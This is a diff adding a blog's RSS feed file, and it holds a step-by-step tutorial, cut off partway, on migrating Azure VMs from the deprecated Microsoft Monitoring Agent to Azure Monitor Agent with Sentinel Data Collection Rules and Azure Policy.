@@ -1,0 +1,1542 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Roberto D'Andrea</title><link>https://robertodandrea.com/</link><description>Recent content on Roberto D'Andrea</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 30 Aug 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://robertodandrea.com/index.xml" rel="self" type="application/rss+xml"/><item><title>Migration from MMA to AMA and DCR configuration + Azure Policy</title><link>https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/</link><pubDate>Thu, 06 Mar 2025 00:00:00 +0000</pubDate><guid>https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/</guid><description>&lt;h1 id="migration-from-mma-to-ama-and-dcr-configuration--azure-policy"&gt;Migration from MMA to AMA and DCR configuration + Azure Policy
+&lt;/h1&gt;&lt;p&gt;Microsoft has announced the deprecation of the &lt;strong&gt;Microsoft Monitoring Agent&lt;/strong&gt; (MMA), effective August 31. If you&amp;rsquo;re still using MMA to collect and manage your monitoring data, now is the time to plan your transition to &lt;strong&gt;Azure Monitor Agent&lt;/strong&gt; (AMA).&lt;/p&gt;
+&lt;div style="
+background: #fffbe5;
+border-left: 7px solid #e9c46a;
+padding: 1em;
+margin: 1em 0;
+border-radius: 6px;
+color: #222;
+"&gt;
+&lt;strong&gt;⚠️ Warning&lt;/strong&gt;
+&lt;div style="margin-top:6px;"&gt;
+&lt;p&gt;The &lt;strong&gt;MMA&lt;/strong&gt; will officially be deprecated on &lt;strong&gt;August 31&lt;/strong&gt;. Although MMA will continue to be active for logging purposes until 1 of February, it’s important to note that Microsoft will not provide support for any issues encountered after August 31.&lt;/p&gt;
+&lt;p&gt;Therefore, to ensure uninterrupted support and to take advantage of the latest features, you should complete your migration to AMA before the deprecation date.&lt;/p&gt;
+&lt;/div&gt;
+&lt;style&gt;
+@media (prefers-color-scheme: dark) {
+div[style*='background: #fffbe5'] {
+background: #322911 !important;
+color: #f3e7be !important;
+border-left: 7px solid #e9c46a !important;
+}
+div[style*='background: #fffbe5'] strong {
+color: #ffe066 !important;
+}
+}
+&lt;/style&gt;
+&lt;/div&gt;
+&lt;p&gt;The Azure Monitor Agent represents a significant advancement in monitoring capabilities, offering enhanced performance, security, and flexibility. Microsoft recommends migrating to AMA to take advantage of these improvements and ensure continued support for your monitoring needs.&lt;/p&gt;
+&lt;p&gt;In this post, we’ll guide you through the migration process by showing you how to configure and install the new Azure Monitor Agent, set up &lt;strong&gt;Data Collection Rules&lt;/strong&gt; (DCR), and apply Azure policies to automate the deployment of both the AMA agent and DCR. This step-by-step guide will ensure a seamless transition and help you leverage the latest monitoring technology efficiently.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Content&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;AMA Migration Workbook&lt;/li&gt;
+&lt;li&gt;Agent Installation - Creation of DCR&lt;/li&gt;
+&lt;li&gt;Azure Policy&lt;/li&gt;
+&lt;li&gt;Conclusion&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id="1-ama-migration-workbook"&gt;1. AMA Migration Workbook
+&lt;/h3&gt;&lt;p&gt;To get a comprehensive view of all the VMs, Azure Arc resources, and VMSS that need to be migrated to the new Azure Monitor Agent (AMA), you can use this workbook.&lt;/p&gt;
+&lt;p&gt;Navigate over Monitor Service on Azure → Workbooks → AMA Migration Helper&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/AMAMigrationHelper-Workbook.png"
+width="1046"
+height="714"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/AMAMigrationHelper-Workbook_hu_5f96a3c9fdf71ff.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/AMAMigrationHelper-Workbook_hu_d09959ab620cabdd.png 1024w"
+loading="lazy"
+alt="AMA Migration Helper - Workbook"
+class="gallery-image"
+data-flex-grow="146"
+data-flex-basis="351px"
+&gt;&lt;/p&gt;
+&lt;p&gt;Here you can find the migration status, with all the machines to be migrated categorized by different resource types. The workbook highlights:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;span style="color:blue"&gt;&lt;strong&gt;In blue:&lt;/strong&gt;&lt;/span&gt; Agents with both agents.&lt;/li&gt;
+&lt;li&gt;&lt;span style="color:red"&gt;&lt;strong&gt;In red:&lt;/strong&gt;&lt;/span&gt; Agents with only MMA/OMS.&lt;/li&gt;
+&lt;li&gt;&lt;span style="color:green"&gt;&lt;strong&gt;In green:&lt;/strong&gt;&lt;/span&gt; Agents with only AMA.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/AMAMigrationHelper-Workbook2.png"
+width="1898"
+height="857"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/AMAMigrationHelper-Workbook2_hu_7eb0071b56ffed02.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/AMAMigrationHelper-Workbook2_hu_b77ae6a5106bba5f.png 1024w"
+loading="lazy"
+alt="AMA Migration Helper - Workbook"
+class="gallery-image"
+data-flex-grow="221"
+data-flex-basis="531px"
+&gt;&lt;/p&gt;
+&lt;p&gt;Within each tab, you can also see detailed status updates for agent installations on each VM, Azure ARC or VMSS highlighting the specific installation status.&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/AzureVirtualMachine.png"
+width="1633"
+height="470"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/AzureVirtualMachine_hu_8f00c0552ecbd6e9.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/AzureVirtualMachine_hu_c0490304fe381526.png 1024w"
+loading="lazy"
+alt="Azure Virtual Machine"
+class="gallery-image"
+data-flex-grow="347"
+data-flex-basis="833px"
+&gt;&lt;/p&gt;
+&lt;div style="
+background: #fff;
+border-left: 7px solid #d1d5db;
+padding: 1em;
+margin: 1em 0;
+border-radius: 6px;
+color: #222;
+"&gt;
+&lt;strong&gt;
+💡
+&lt;/strong&gt;
+&lt;div style="margin-top:6px;"&gt;
+This workbook can be very useful as it provides detailed insights into the agent installations allowing you to view each installation in detail.
+&lt;/div&gt;
+&lt;style&gt;
+div[style*='border-left: 7px'][style*='background'] a {
+color: #2563eb !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #1d4ed8 !important;
+}
+@media (prefers-color-scheme: dark) {
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] {
+background: #232323 !important;
+color: #eee !important;
+border-left: 7px solid #6b7280 !important;
+}
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] strong {
+color: #eee !important;
+}
+div[style*='border-left: 7px'][style*='background'] a {
+color: #86b7fd !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #f9fafb !important;
+}
+}
+&lt;/style&gt;
+&lt;/div&gt;
+&lt;h3 id="2-agent-installation---creation-of-dcr-windows"&gt;2. Agent Installation - Creation of DCR (Windows)
+&lt;/h3&gt;&lt;div style="
+background: #fffbe5;
+border-left: 7px solid #e9c46a;
+padding: 1em;
+margin: 1em 0;
+border-radius: 6px;
+color: #222;
+"&gt;
+&lt;strong&gt;⚠️ Warning&lt;/strong&gt;
+&lt;div style="margin-top:6px;"&gt;
+You need to create the DCR from Sentinel Connector
+&lt;/div&gt;
+&lt;style&gt;
+@media (prefers-color-scheme: dark) {
+div[style*='background: #fffbe5'] {
+background: #322911 !important;
+color: #f3e7be !important;
+border-left: 7px solid #e9c46a !important;
+}
+div[style*='background: #fffbe5'] strong {
+color: #ffe066 !important;
+}
+}
+&lt;/style&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;em&gt;Naviga su Sentinel → Data Connector → Windows Security Events via AMA&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/AMAConnector.png"
+width="914"
+height="161"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/AMAConnector_hu_3350083b759b266d.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/AMAConnector_hu_da4174c65eba2296.png 1024w"
+loading="lazy"
+alt="AMA Connector (Windows &amp; Mac)"
+class="gallery-image"
+data-flex-grow="567"
+data-flex-basis="1362px"
+&gt;&lt;/p&gt;
+&lt;p&gt;Open connector page&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/WindowsAMAConnector.png"
+width="438"
+height="705"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/WindowsAMAConnector_hu_741b0fc37ea528d6.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/WindowsAMAConnector_hu_f0f1ad3c11337e8a.png 1024w"
+loading="lazy"
+alt="Windows AMA Connector"
+class="gallery-image"
+data-flex-grow="62"
+data-flex-basis="149px"
+&gt;&lt;/p&gt;
+&lt;p&gt;Here tou can create your DCR&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/DCRCreation.png"
+width="742"
+height="503"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/DCRCreation_hu_34e1cf042199d871.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/DCRCreation_hu_a69feaa9e4edae69.png 1024w"
+loading="lazy"
+alt="Data Collection Rule creation"
+class="gallery-image"
+data-flex-grow="147"
+data-flex-basis="354px"
+&gt;&lt;/p&gt;
+&lt;div style="
+background: #fff;
+border-left: 7px solid #d1d5db;
+padding: 1em;
+margin: 1em 0;
+border-radius: 6px;
+color: #222;
+"&gt;
+&lt;strong&gt;
+💡
+&lt;/strong&gt;
+&lt;div style="margin-top:6px;"&gt;
+What I recommend is creating separate Data Collection Rules for each type of host, such as Windows and Linux (use Syslog via AMA), and also &lt;strong&gt;dividing the DCRs for other groups of machines&lt;/strong&gt;. This approach ensures that you have DCRs with specific events tailored to different types of hosts
+&lt;/div&gt;
+&lt;style&gt;
+div[style*='border-left: 7px'][style*='background'] a {
+color: #2563eb !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #1d4ed8 !important;
+}
+@media (prefers-color-scheme: dark) {
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] {
+background: #232323 !important;
+color: #eee !important;
+border-left: 7px solid #6b7280 !important;
+}
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] strong {
+color: #eee !important;
+}
+div[style*='border-left: 7px'][style*='background'] a {
+color: #86b7fd !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #f9fafb !important;
+}
+}
+&lt;/style&gt;
+&lt;/div&gt;
+&lt;p&gt;Define Name for the DCR and Resource Group where is stored (default will be Sentinel)&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/DCRName.png"
+width="799"
+height="337"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/DCRName_hu_9a8f24fe159d046d.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/DCRName_hu_fd8659eda35ca65.png 1024w"
+loading="lazy"
+alt="DCR Name"
+class="gallery-image"
+data-flex-grow="237"
+data-flex-basis="569px"
+&gt;&lt;/p&gt;
+&lt;p&gt;In the Resources tab select all the VM and Azure Arc that you want to monitoring.&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/DCRResource.png"
+width="793"
+height="522"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/DCRResource_hu_90371a52a5d08a75.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/DCRResource_hu_ac593d1b22071ecc.png 1024w"
+loading="lazy"
+alt="DCR Resource"
+class="gallery-image"
+data-flex-grow="151"
+data-flex-basis="364px"
+&gt;&lt;/p&gt;
+&lt;p&gt;After all you need to select with kind of event you want to store.&lt;/p&gt;
+&lt;div style="
+background: #fff;
+border-left: 7px solid #d1d5db;
+padding: 1em;
+margin: 1em 0;
+border-radius: 6px;
+color: #222;
+"&gt;
+&lt;strong&gt;
+💡
+&lt;/strong&gt;
+&lt;div style="margin-top:6px;"&gt;
+&lt;p&gt;To better understand what to ingest, here you can find &lt;strong&gt;guides&lt;/strong&gt; that describe in detail what each tab represents.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Windows&lt;/strong&gt; → &lt;a class="link" href="https://learn.microsoft.com/en-us/azure/sentinel/windows-security-event-id-reference" target="_blank" rel="noopener"
+&gt;Windows Security Event Reference&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Linux&lt;/strong&gt; → &lt;a class="link" href="https://learn.microsoft.com/en-us/azure/azure-monitor/agents/data-sources-syslog#configure-syslog-in-the-azure-portal" target="_blank" rel="noopener"
+&gt;Configure Syslog in Azure portal&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Deep Dive on Linux event&lt;/strong&gt; → &lt;a class="link" href="https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/deep-dive-how-to-debug-syslog-ingestion-for-sentinel-and-log/ba-p/2007056" target="_blank" rel="noopener"
+&gt;How to debug Syslog ingestion&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+&lt;style&gt;
+div[style*='border-left: 7px'][style*='background'] a {
+color: #2563eb !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #1d4ed8 !important;
+}
+@media (prefers-color-scheme: dark) {
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] {
+background: #232323 !important;
+color: #eee !important;
+border-left: 7px solid #6b7280 !important;
+}
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] strong {
+color: #eee !important;
+}
+div[style*='border-left: 7px'][style*='background'] a {
+color: #86b7fd !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #f9fafb !important;
+}
+}
+&lt;/style&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/DCRCollect.png"
+width="414"
+height="192"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/DCRCollect_hu_e8894c717defd127.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/DCRCollect_hu_5b80fa7c6a127487.png 1024w"
+loading="lazy"
+alt="DCR Collect"
+class="gallery-image"
+data-flex-grow="215"
+data-flex-basis="517px"
+&gt;&lt;/p&gt;
+&lt;p&gt;After all click on Create and wait the creation of DCR and the deploy of AMA over VM and Azure ARC.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Evidence of DCR created over DCR services&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/DataCollectionRuleEvidence.png"
+width="1818"
+height="452"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/DataCollectionRuleEvidence_hu_a63b011b19f0d0a7.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/DataCollectionRuleEvidence_hu_3be2cfd7ea561a51.png 1024w"
+loading="lazy"
+alt="Data Collection Rule Evidence"
+class="gallery-image"
+data-flex-grow="402"
+data-flex-basis="965px"
+&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Evidence of AMA installation on VM&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/AMAAgentOnVM.png"
+width="1902"
+height="647"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/AMAAgentOnVM_hu_78976f2c155690f0.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/AMAAgentOnVM_hu_9401de53f50c8727.png 1024w"
+loading="lazy"
+alt="Navigate over VM → Extensions &amp;#43; application "
+class="gallery-image"
+data-flex-grow="293"
+data-flex-basis="705px"
+&gt;&lt;/p&gt;
+&lt;div style="
+background: #fff5f5;
+border-left: 7px solid #ef4444;
+padding: 1em;
+margin: 1em 0;
+border-radius: 6px;
+color: #991b1b;
+"&gt;
+&lt;strong&gt;🚨 Alert&lt;/strong&gt;
+&lt;div style="margin-top:6px;"&gt;
+&lt;strong&gt;Remember to unistall the MMA agent&lt;/strong&gt;, as having it active could result in duplicate events within your workspace.
+&lt;img src="https://robertodandrea.com/images/UnistallAMAAgent.png"
+loading="lazy"
+alt="Unistall AMA Agent"
+&gt;
+&lt;/div&gt;
+&lt;style&gt;
+@media (prefers-color-scheme: dark) {
+div[style*='background: #fff5f5'] {
+background: #2b1818 !important;
+color: #fff5f5 !important;
+border-left: 7px solid #fb7185 !important;
+}
+div[style*='background: #fff5f5'] strong {
+color: #fde0e0 !important;
+}
+div[style*='background: #fff5f5'] img {
+border: 1px solid #fb7185 !important;
+border-radius: 8px;
+margin-top: 10px;
+margin-bottom: 4px;
+max-width: 100%;
+}
+}
+div[style*='background: #fff5f5'] img {
+border: 1px solid #ef4444;
+border-radius: 8px;
+margin-top: 10px;
+margin-bottom: 4px;
+max-width: 100%;
+}
+&lt;/style&gt;
+&lt;/div&gt;
+&lt;h3 id="3-azure-policy"&gt;3. Azure Policy
+&lt;/h3&gt;&lt;p&gt;Azure Policy can be used to deploy the Azure Monitor Agent. To achieve this, follow these steps:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Navigate to the Azure Policy Section:&lt;/strong&gt; Access the Azure portal and go to the &amp;ldquo;Policy&amp;rdquo; section from the left-hand menu.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Create a New Policy:&lt;/strong&gt; In the Azure Policy dashboard, select &amp;ldquo;Create Policy&amp;rdquo; to start the process of defining a new policy.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Configure the Policy:&lt;/strong&gt; Set up the policy parameters to deploy the Azure Monitor Agent. You can specify the conditions under which the agent should be installed and apply it to the appropriate scope, such as specific resource groups or subscriptions.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Assign the Policy:&lt;/strong&gt; Once configured, assign the policy to the desired resources. This will ensure that the Azure Monitor Agent is automatically installed on all resources that meet the policy criteria.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div style="
+background: #fff;
+border-left: 7px solid #d1d5db;
+padding: 1em;
+margin: 1em 0;
+border-radius: 6px;
+color: #222;
+"&gt;
+&lt;strong&gt;
+💡
+&lt;/strong&gt;
+&lt;div style="margin-top:6px;"&gt;
+Here you can find &lt;strong&gt;guides&lt;/strong&gt; that describe in detail the Azure Policy.
+There are built-in policy initiatives for Windows and Linux virtual machines &lt;a class="link" href="https://learn.microsoft.com/en-us/azure/azure-monitor/agents/azure-monitor-agent-policy#built-in-policy-initiatives" target="_blank" rel="noopener"
+&gt;Azure Policy&lt;/a&gt;
+&lt;/div&gt;
+&lt;style&gt;
+div[style*='border-left: 7px'][style*='background'] a {
+color: #2563eb !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #1d4ed8 !important;
+}
+@media (prefers-color-scheme: dark) {
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] {
+background: #232323 !important;
+color: #eee !important;
+border-left: 7px solid #6b7280 !important;
+}
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] strong {
+color: #eee !important;
+}
+div[style*='border-left: 7px'][style*='background'] a {
+color: #86b7fd !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #f9fafb !important;
+}
+}
+&lt;/style&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/BuiltinPolicy.png"
+width="846"
+height="372"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/BuiltinPolicy_hu_3ebeacc5e995858d.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/BuiltinPolicy_hu_fd8f857d4066aeba.png 1024w"
+loading="lazy"
+alt="Built-in Policy"
+class="gallery-image"
+data-flex-grow="227"
+data-flex-basis="545px"
+&gt;&lt;/p&gt;
+&lt;p&gt;Within these two rules, I recommend selecting exclusively the following two policies that are essential for installing the Azure Monitor Agent (AMA) and assigning the Data Collection Rule (DCR) to the VM:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Policy for Installing the Azure Monitor Agent (AMA):&lt;/strong&gt; This policy ensures that the AMA is automatically deployed on the targeted virtual machines. It simplifies the installation process by applying the agent configuration across your environment.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Policy for Assigning Data Collection Rules (DCRs):&lt;/strong&gt; This policy is responsible for applying the appropriate DCR to each VM. It guarantees that the data collection settings are consistently applied, enabling accurate and comprehensive monitoring.&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy.png"
+width="1788"
+height="545"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy_hu_b5f7bf215da0586e.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy_hu_ad500edcb23701b2.png 1024w"
+loading="lazy"
+alt="Policy"
+class="gallery-image"
+data-flex-grow="328"
+data-flex-basis="787px"
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Policy for Installing the Azure Monitor Agent (AMA)&lt;/strong&gt;
+&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/AMAPolicy.png"
+width="1755"
+height="536"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/AMAPolicy_hu_3cc2a8d9fc2c4bfb.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/AMAPolicy_hu_2ba8a11c4b4f5f17.png 1024w"
+loading="lazy"
+alt="AMA Policy"
+class="gallery-image"
+data-flex-grow="327"
+data-flex-basis="785px"
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Starting for the first one click on &lt;em&gt;Configure Windows virtual machines to run Azure Monitor Agent with user-assigned managed identity-based authentication&lt;/em&gt; and click on Assign&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/AssignPolicy.png"
+width="1880"
+height="642"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/AssignPolicy_hu_54caf177fbea1b49.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/AssignPolicy_hu_f70b85838a03adde.png 1024w"
+loading="lazy"
+alt="Assign Policy"
+class="gallery-image"
+data-flex-grow="292"
+data-flex-basis="702px"
+&gt;&lt;/p&gt;
+&lt;p&gt;Here you need to select the Scope where the Policy will be executed.&lt;/p&gt;
+&lt;p&gt;For example you can also select all Subscption or even specific Resource Group.&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Scope.png"
+width="1911"
+height="651"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Scope_hu_5d416883408b3859.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Scope_hu_b42b0b996bd499c1.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="293"
+data-flex-basis="704px"
+&gt;&lt;/p&gt;
+&lt;div style="
+background: #fff;
+border-left: 7px solid #d1d5db;
+padding: 1em;
+margin: 1em 0;
+border-radius: 6px;
+color: #222;
+"&gt;
+&lt;strong&gt;
+💡
+&lt;/strong&gt;
+&lt;div style="margin-top:6px;"&gt;
+You can also build an Exclusions path to ensure that you do not unintentionally apply the policy you are creating.
+&lt;/div&gt;
+&lt;style&gt;
+div[style*='border-left: 7px'][style*='background'] a {
+color: #2563eb !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #1d4ed8 !important;
+}
+@media (prefers-color-scheme: dark) {
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] {
+background: #232323 !important;
+color: #eee !important;
+border-left: 7px solid #6b7280 !important;
+}
+div[style*='background: #fff'][style*='border-left: 7px solid #d1d5db'] strong {
+color: #eee !important;
+}
+div[style*='border-left: 7px'][style*='background'] a {
+color: #86b7fd !important;
+text-decoration: underline;
+}
+div[style*='border-left: 7px'][style*='background'] a:hover {
+color: #f9fafb !important;
+}
+}
+&lt;/style&gt;
+&lt;/div&gt;
+&lt;p&gt;Skip the Advances step&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy2.png"
+width="1332"
+height="647"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy2_hu_3bc069688bb548d9.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy2_hu_8a35f69c275a48a7.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="205"
+data-flex-basis="494px"
+&gt;&lt;/p&gt;
+&lt;p&gt;On Parameters step set Bring Your Own User-Assigned Managed Identity as True&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy3.png"
+width="1362"
+height="363"
+srcset="https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy3_hu_10d5b0da8e11d18e.png 480w, https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/Policy3_hu_efb4e1cd7e654dee.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="375"
+data-flex-basis="900px"
+&gt;&lt;/p&gt;
+&lt;p&gt;In the Remediation tab, enter a &lt;strong&gt;user-assigned managed identity&lt;/strong&gt; and check the box for &amp;ldquo;Create Remediation Task.&amp;rdquo; This will ensure that the policy uses the specified identity and sets up a remediation task if needed.&lt;/p&gt;
+&lt;div style="
+background: #fff;
+border-left: 7px solid #d1d5db;
+padding: 1em;
+margin: 1em 0;
+border-radius: 6px;
+color: #222;
+"&gt;
+&lt;strong&gt;
+💡
+&lt;/strong&gt;
+&lt;div style="margin-top:6px;"&gt;
+&lt;p&gt;Create &lt;strong&gt;user-assigned managed identity&lt;/strong&gt; in order to have a identity that have the correct permission to install AMA and also assign the DCR.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Required permissions:&lt;/strong&gt; &lt;a class="link" href="https://learn.microsoft.com/en-us/azure/azure-monitor/essentials/data-collection-rule-create-edit?tabs=portal#permissions" target="_blank" rel="noopener"
+&gt;Create and Edit DCR&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Navigate over Managed Identities and click on Create&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/images/ManagedIdentity.png"
+loading="lazy"
+alt="Managed Identity Setup"
+&gt;&lt;/p&gt;
+&lt;p&gt;After creating it, remember to add the required permissions in the Azure Role Assignments section.&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/images/RoleDefinition.png"
+loading="lazy"
+alt="Role definition"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Role example (here I add owner just for a test)&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/images/RoleMI.png"
+loading="lazy"
+&gt;&lt;/p&gt;
